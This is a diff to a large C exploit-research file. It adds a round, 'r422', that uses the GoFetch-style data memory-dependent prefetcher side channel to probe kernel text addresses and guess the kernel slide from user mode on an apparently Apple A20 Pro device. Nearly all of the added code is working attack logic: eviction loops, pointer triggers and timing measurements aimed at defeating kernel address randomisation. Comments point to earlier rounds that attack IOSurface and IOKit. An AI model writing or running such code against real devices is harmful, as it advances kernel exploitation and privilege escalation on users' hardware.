@@ -16550,6 +16550,240 @@ static void *r419_race_reader(void *arg) {
 }
 
 /*
+ * r422: DMP kernel address probe.
+ *
+ * DMP is confirmed active on A20 Pro (Vector 2 of r421 showed 48% speedup).
+ * Now use DMP to probe kernel virtual addresses. The DMP treats data values
+ * as pointers and prefetches them. If we write a kernel address into memory,
+ * the DMP may try to prefetch from that address. Even though we're at EL0,
+ * the DMP hardware might still issue the prefetch using the kernel page
+ * tables (this is the core of the GoFetch attack).
+ *
+ * Strategy:
+ * 1. Allocate a large probe buffer (eviction set)
+ * 2. For each candidate kernel slide:
+ *    a. Evict the probe buffer from cache
+ *    b. Write candidate kernel text address into a "trigger" location
+ *    c. Access the trigger to let DMP see the pointer
+ *    d. Measure if any part of probe buffer became faster (cache collision)
+ * 3. If DMP successfully prefetches a kernel page, it will evict/load
+ *    cache lines that we can detect.
+ *
+ * Alternative approach: use IOSurface backing store as the trigger.
+ * Write candidate addresses into surface backing, let kernel-side operations
+ * on the surface cause DMP to process those addresses.
+ */
+
+static void r422_probe(void) {
+    rlog("\n=== r422: DMP Kernel Address Probe ===\n\n");
+    fflush(stdout);
+
+    mach_timebase_info_data_t tbinfo;
+    mach_timebase_info(&tbinfo);
+
+    /* ---- Phase 1: Validate DMP works with known addresses ---- */
+    rlog("  Phase 1: DMP validation with known addresses\n");
+    {
+        /* Allocate 3 regions: trigger, target, eviction */
+        size_t sz = 64 * 4096;
+        volatile uint8_t *trigger = (volatile uint8_t *)mmap(NULL, sz,
+            PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        volatile uint8_t *target = (volatile uint8_t *)mmap(NULL, sz,
+            PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        volatile uint8_t *evictor = (volatile uint8_t *)mmap(NULL, sz,
+            PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+
+        if (trigger != MAP_FAILED && target != MAP_FAILED &&
+            evictor != MAP_FAILED) {
+            /* Touch all */
+            for (size_t i = 0; i < sz; i += 4096) {
+                trigger[i] = 1; target[i] = 2; evictor[i] = 3;
+            }
+
+            int N = 500;
+
+            /* Control: evict target, write ZERO into trigger, measure */
+            uint64_t ctrl_sum = 0;
+            for (int i = 0; i < N; i++) {
+                for (int j = 0; j < 64; j++) evictor[j * 4096] = (uint8_t)j;
+                for (int j = 0; j < 64; j++) target[j * 4096] = (uint8_t)j;
+                __asm__ volatile("dsb sy; isb" ::: "memory");
+                *(volatile uint64_t *)trigger = 0;
+                volatile uint64_t v = *(volatile uint64_t *)trigger;
+                (void)v;
+                __asm__ volatile("dsb sy" ::: "memory");
+                for (volatile int d = 0; d < 200; d++);
+                uint64_t t0 = mach_absolute_time();
+                volatile uint8_t x = target[0];
+                (void)x;
+                uint64_t t1 = mach_absolute_time();
+                ctrl_sum += (t1 - t0);
+            }
+
+            /* DMP: evict target, write target's address into trigger */
+            uint64_t dmp_sum = 0;
+            for (int i = 0; i < N; i++) {
+                for (int j = 0; j < 64; j++) evictor[j * 4096] = (uint8_t)j;
+                for (int j = 0; j < 64; j++) target[j * 4096] = (uint8_t)j;
+                __asm__ volatile("dsb sy; isb" ::: "memory");
+                *(volatile uint64_t *)trigger = (uint64_t)target;
+                volatile uint64_t v = *(volatile uint64_t *)trigger;
+                (void)v;
+                __asm__ volatile("dsb sy" ::: "memory");
+                for (volatile int d = 0; d < 200; d++);
+                uint64_t t0 = mach_absolute_time();
+                volatile uint8_t x = target[0];
+                (void)x;
+                uint64_t t1 = mach_absolute_time();
+                dmp_sum += (t1 - t0);
+            }
+
+            /* Unmapped address test: write 0xDEAD... */
+            uint64_t bad_sum = 0;
+            for (int i = 0; i < N; i++) {
+                for (int j = 0; j < 64; j++) evictor[j * 4096] = (uint8_t)j;
+                for (int j = 0; j < 64; j++) target[j * 4096] = (uint8_t)j;
+                __asm__ volatile("dsb sy; isb" ::: "memory");
+                *(volatile uint64_t *)trigger = 0xDEADBEEF00000000ULL;
+                volatile uint64_t v = *(volatile uint64_t *)trigger;
+                (void)v;
+                __asm__ volatile("dsb sy" ::: "memory");
+                for (volatile int d = 0; d < 200; d++);
+                uint64_t t0 = mach_absolute_time();
+                volatile uint8_t x = target[0];
+                (void)x;
+                uint64_t t1 = mach_absolute_time();
+                bad_sum += (t1 - t0);
+            }
+
+            rlog("    Control (zero):   avg=%.2f MAT\n", (double)ctrl_sum / N);
+            rlog("    DMP (valid ptr):  avg=%.2f MAT\n", (double)dmp_sum / N);
+            rlog("    Bad (unmapped):   avg=%.2f MAT\n", (double)bad_sum / N);
+
+            munmap((void *)trigger, sz);
+            munmap((void *)target, sz);
+            munmap((void *)evictor, sz);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Phase 2: Try kernel address range ---- */
+    rlog("\n  Phase 2: DMP probe of kernel address candidates\n");
+    {
+        size_t sz = 64 * 4096;
+        volatile uint8_t *trigger = (volatile uint8_t *)mmap(NULL, sz,
+            PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        volatile uint8_t *target = (volatile uint8_t *)mmap(NULL, sz,
+            PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        volatile uint8_t *evictor = (volatile uint8_t *)mmap(NULL, sz,
+            PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+
+        if (trigger != MAP_FAILED && target != MAP_FAILED &&
+            evictor != MAP_FAILED) {
+            for (size_t i = 0; i < sz; i += 4096) {
+                trigger[i] = 1; target[i] = 2; evictor[i] = 3;
+            }
+
+            int N = 200;
+
+            /* Test kernel text base candidates.
+               Kernel text base = 0xFFFFFFF007004000 + slide
+               Slide is 2MB aligned (0x200000), range 0 to ~0x20000000 (512MB) */
+            uint64_t baseAddr = 0xFFFFFFF007004000ULL;
+
+            /* First: establish baseline with clearly invalid address */
+            uint64_t base_sum = 0;
+            for (int i = 0; i < N; i++) {
+                for (int j = 0; j < 64; j++) evictor[j * 4096] = (uint8_t)j;
+                __asm__ volatile("dsb sy; isb" ::: "memory");
+                *(volatile uint64_t *)trigger = 0;
+                volatile uint64_t v = *(volatile uint64_t *)trigger;
+                (void)v;
+                __asm__ volatile("dsb sy" ::: "memory");
+                for (volatile int d = 0; d < 200; d++);
+                uint64_t t0 = mach_absolute_time();
+                volatile uint8_t x = target[0];
+                (void)x;
+                uint64_t t1 = mach_absolute_time();
+                base_sum += (t1 - t0);
+            }
+            double baseAvg = (double)base_sum / N;
+            rlog("    Baseline (zero ptr): avg=%.2f MAT\n", baseAvg);
+
+            /* Probe 16 candidate slides (coarse scan) */
+            rlog("    Probing kernel addresses (coarse, 32MB steps):\n");
+            for (int s = 0; s < 16; s++) {
+                uint64_t slide = (uint64_t)s * 0x2000000ULL; /* 32MB steps */
+                uint64_t candidate = baseAddr + slide;
+
+                uint64_t sum = 0;
+                for (int i = 0; i < N; i++) {
+                    for (int j = 0; j < 64; j++)
+                        evictor[j * 4096] = (uint8_t)j;
+                    __asm__ volatile("dsb sy; isb" ::: "memory");
+                    *(volatile uint64_t *)trigger = candidate;
+                    volatile uint64_t v = *(volatile uint64_t *)trigger;
+                    (void)v;
+                    __asm__ volatile("dsb sy" ::: "memory");
+                    for (volatile int d = 0; d < 200; d++);
+                    uint64_t t0 = mach_absolute_time();
+                    volatile uint8_t x = target[0];
+                    (void)x;
+                    uint64_t t1 = mach_absolute_time();
+                    sum += (t1 - t0);
+                }
+                double avg = (double)sum / N;
+                rlog("      slide=0x%08llx addr=0x%llx avg=%.2f MAT",
+                    (unsigned long long)slide,
+                    (unsigned long long)candidate, avg);
+                if (avg < baseAvg * 0.7)
+                    rlog(" *** FAST - possible DMP prefetch ***");
+                rlog("\n");
+            }
+
+            /* Also try writing the shared cache base as a pointer
+               (we know it's mapped, so DMP should prefetch it) */
+            typedef const void* (*get_range_fn)(size_t*);
+            get_range_fn getRangeFn = (get_range_fn)dlsym(RTLD_DEFAULT,
+                "_dyld_get_shared_cache_range");
+            if (getRangeFn) {
+                size_t cacheLen = 0;
+                void *cacheBase = (void*)getRangeFn(&cacheLen);
+                if (cacheBase) {
+                    uint64_t sum = 0;
+                    for (int i = 0; i < N; i++) {
+                        for (int j = 0; j < 64; j++)
+                            evictor[j * 4096] = (uint8_t)j;
+                        __asm__ volatile("dsb sy; isb" ::: "memory");
+                        *(volatile uint64_t *)trigger = (uint64_t)cacheBase;
+                        volatile uint64_t v = *(volatile uint64_t *)trigger;
+                        (void)v;
+                        __asm__ volatile("dsb sy" ::: "memory");
+                        for (volatile int d = 0; d < 200; d++);
+                        uint64_t t0 = mach_absolute_time();
+                        volatile uint8_t x = target[0];
+                        (void)x;
+                        uint64_t t1 = mach_absolute_time();
+                        sum += (t1 - t0);
+                    }
+                    rlog("    Shared cache (0x%llx): avg=%.2f MAT\n",
+                        (unsigned long long)(uint64_t)cacheBase,
+                        (double)sum / N);
+                }
+            }
+
+            munmap((void *)trigger, sz);
+            munmap((void *)target, sz);
+            munmap((void *)evictor, sz);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r422 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r421: IOSurface kernel timing + Prime+Probe DMP + IOKit exception
  *
  * Vector 1: Trigger kernel-side exception through IOSurface IOConnectCallMethod
@@ -71649,6 +71883,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 425) {
+            rlog("*** rounds=425: DMP Kernel Address Probe ***\n");
+            rlog("  Using confirmed DMP to probe kernel virtual address candidates.\n\n");
+            fflush(stdout);
+            r422_probe();
+            goto done;
+        }
         if (rounds == 424) {
             rlog("*** rounds=424: Kernel Timing + Prime+Probe DMP + Voucher ***\n");
             rlog("  IOKit exception, DMP iteration counting, create/destroy timing, voucher.\n\n");
@@ -74209,7 +74450,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
